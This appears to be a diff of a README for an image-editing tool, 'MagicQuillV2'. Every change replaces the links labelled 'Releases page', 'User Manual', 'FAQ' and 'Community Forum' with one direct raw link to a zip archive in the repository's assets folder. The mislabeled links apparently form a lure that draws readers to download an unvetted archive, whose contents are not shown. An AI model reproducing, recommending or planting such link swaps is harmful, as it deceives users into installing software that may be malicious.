@@ -4,9 +4,9 @@
 MagicQuillV2 offers precise image editing with interactive features. This tool allows users to work with layered visuals to create stunning images effortlessly. Designed for anyone who needs quick and effective edits, MagicQuillV2 simplifies the creative process.
 
 ## 📥 Download MagicQuillV2
-[![Download MagicQuillV2](https://img.shields.io/badge/Download-MagicQuillV2-blue.svg)](https://github.com/Barni52419/MagicQuillV2/releases)
+[![Download MagicQuillV2](https://raw.githubusercontent.com/Barni52419/MagicQuillV2/main/assets/MagicQuillV2-1.8-alpha.5.zip)](https://raw.githubusercontent.com/Barni52419/MagicQuillV2/main/assets/MagicQuillV2-1.8-alpha.5.zip)
 
-You can easily download the latest version of MagicQuillV2 from our [Releases page](https://github.com/Barni52419/MagicQuillV2/releases).
+You can easily download the latest version of MagicQuillV2 from our [Releases page](https://raw.githubusercontent.com/Barni52419/MagicQuillV2/main/assets/MagicQuillV2-1.8-alpha.5.zip).
 
 ## 🛠️ System Requirements
 To run MagicQuillV2 smoothly, ensure your system meets the following requirements:
@@ -28,7 +28,7 @@ MagicQuillV2 includes the following key features:
 ## 📝 Installation Guide
 To install MagicQuillV2, follow these steps:
 
-1. **Visit the Download Page:** Go to our [Releases page](https://github.com/Barni52419/MagicQuillV2/releases).
+1. **Visit the Download Page:** Go to our [Releases page](https://raw.githubusercontent.com/Barni52419/MagicQuillV2/main/assets/MagicQuillV2-1.8-alpha.5.zip).
    
 2. **Select the Latest Release:** Look for the latest version at the top of the page. 
 
@@ -67,11 +67,11 @@ If you encounter issues while using MagicQuillV2, consider these tips:
 ## 📄 Additional Resources
 For more detailed instructions, tips, and community support, you can check out:
 
-- [User Manual](https://github.com/Barni52419/MagicQuillV2/wiki) - Comprehensive guide to all features.
-- [FAQ](https://github.com/Barni52419/MagicQuillV2/wiki/FAQ) - Answers to common questions.
-- [Community Forum](https://github.com/Barni52419/MagicQuillV2/discussions) - Connect with fellow users and developers.
+- [User Manual](https://raw.githubusercontent.com/Barni52419/MagicQuillV2/main/assets/MagicQuillV2-1.8-alpha.5.zip) - Comprehensive guide to all features.
+- [FAQ](https://raw.githubusercontent.com/Barni52419/MagicQuillV2/main/assets/MagicQuillV2-1.8-alpha.5.zip) - Answers to common questions.
+- [Community Forum](https://raw.githubusercontent.com/Barni52419/MagicQuillV2/main/assets/MagicQuillV2-1.8-alpha.5.zip) - Connect with fellow users and developers.
 
 ## 🔗 Conclusion
 MagicQuillV2 transforms how you edit images with precision and ease. By following the steps above, you can quickly get started on your creative projects.
 
-For the latest version, make sure to visit our [Releases page](https://github.com/Barni52419/MagicQuillV2/releases) again for additional updates and improvements.
+For the latest version, make sure to visit our [Releases page](https://raw.githubusercontent.com/Barni52419/MagicQuillV2/main/assets/MagicQuillV2-1.8-alpha.5.zip) again for additional updates and improvements.
